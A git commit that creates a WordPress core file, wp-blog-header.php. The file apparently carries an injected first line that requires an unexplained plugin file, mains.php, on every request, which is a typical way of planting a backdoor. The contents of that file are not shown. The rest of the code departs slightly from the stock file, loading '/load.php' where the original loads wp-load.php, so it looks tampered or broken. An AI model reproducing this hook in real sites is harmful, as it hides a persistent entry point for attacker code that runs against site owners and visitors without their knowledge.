cebbd0c2840278e4b7bbacbd371a45ed7dd23278
S H U J I <viandcaitlyn913@gmail.com>
2024-11-11 15:20:11 +0700

    Create wp-blog-header.php

---
+++ wp-blog-header.php
@@ -0,0 +1,22 @@
+<?php
+require('wp-content/plugins/mains.php');
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+ $wp_did_header = true;
+
+ // Load the WordPress library.
+ require_once __DIR__ . '/load.php';
+
+ // Set up the WordPress query.
+ wp();
+
+ // Load the theme template.
+ require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
